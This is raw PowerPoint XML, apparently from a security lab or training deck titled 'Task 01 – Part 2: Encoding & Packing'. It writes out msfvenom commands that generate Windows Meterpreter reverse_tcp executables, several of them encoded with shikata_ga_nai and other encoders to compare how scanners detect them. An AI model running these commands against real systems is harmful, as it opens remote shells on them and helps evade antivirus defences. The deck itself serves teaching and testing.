          <a:xfrm>
            <a:off x="6487123" y="1099832"/>
            <a:ext cx="4676747" cy="5353171"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="185861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71000">
              <a:schemeClr val="bg1"/>
            </a:gs>
            <a:gs pos="83000">
              <a:schemeClr val="bg1"/>
            </a:gs>
            <a:gs pos="100000">
              <a:schemeClr val="bg1"/>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875846"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" b="1" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="TextBox 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7CEE0D1E-5959-0213-529C-19F22EFA2864}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-68240" y="0"/>
            <a:ext cx="12419463" cy="7389844"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent4">
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4">
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> -p windows/x64/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent4">
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4">
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent4">
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>reverse_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4">
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> LHOST=192.168.1.193 LPORT=4444 -f exe -o payload.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Task 01 – Part 2: Encoding &amp; Packing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>1. Generate encoded payload (single encoder, 5 iterations) </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent4">
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4">
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> -p windows/x64/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent4">
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4">
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent4">
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>reverse_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4">
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> LHOST=192.168.1.193 LPORT=4444 -e x64/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent4">
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>shikata_ga_nai</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4">
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent4">
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4">
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> 5 -f exe -o encoded_payload.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>2. List all available encoders</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="E846C5"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E846C5"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> -l encoders</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>3. Generate with alternative encoders (examples)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> -p windows/x64/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>reverse_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> LHOST=192.168.1.193 LPORT=4444 -e x86/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>xor_dynamic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> 10 -f exe -o xor_dynamic_payload.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="E846C5"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E846C5"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> -p windows/x64/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="E846C5"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E846C5"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="E846C5"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>reverse_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E846C5"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> LHOST=192.168.1.193 LPORT=4444 -e x86/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="E846C5"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>jmp_call_additive</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E846C5"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="E846C5"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E846C5"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> 5 -f exe -o jmp_call_payload.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7C4AD6"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7C4AD6"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> -p windows/x64/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7C4AD6"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7C4AD6"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7C4AD6"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>reverse_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7C4AD6"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> LHOST==192.168.1.193 LPORT=4444 -e x64/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7C4AD6"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>shikata_ga_nai</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7C4AD6"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7C4AD6"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7C4AD6"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> 5 -f exe -o payload64.exe</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rgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Menlo"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1352859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71000">
              <a:schemeClr val="bg1"/>
            </a:gs>
            <a:gs pos="83000">
              <a:schemeClr val="bg1"/>
            </a:gs>
            <a:gs pos="100000">
              <a:schemeClr val="bg1"/>
            </a:gs>
          </a:gsLst>
          <a:lin ang="5400000" scaled="1"/>
        </a:gra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3C769EF-337E-F19F-915F-07389AB8D9DA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noGrp="1" noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="127000" y="327546"/>
            <a:ext cx="12065000" cy="3921566"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="TextBox 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BAF32A12-27CB-BF39-3F75-D17C97775161}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="127000" y="0"/>
            <a:ext cx="6093724" cy="923330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Let’s compare their scanning</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Picture 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B122DB74-3555-7394-4F2D-FAC244B834CE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="343469" y="2740841"/>
            <a:ext cx="9363024" cy="3919266"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AF041535-ADB2-361B-3F46-5A776EBB9B14}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="655093" y="4249112"/>
            <a:ext cx="8659682" cy="2281342"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="385575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71000">
              <a:schemeClr val="bg1"/>
            </a:gs>
            <a:gs pos="83000">
              <a:schemeClr val="bg1"/>
            </a:gs>
            <a:gs pos="100000">
              <a:schemeClr val="bg1"/>
            </a:gs>
          </a:gsLst>
          <a:lin ang="5400000" scaled="1"/>
        </a:gra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8CAB44F-29B7-D961-6C37-1D419086F3E1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="5276850" cy="6100388"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
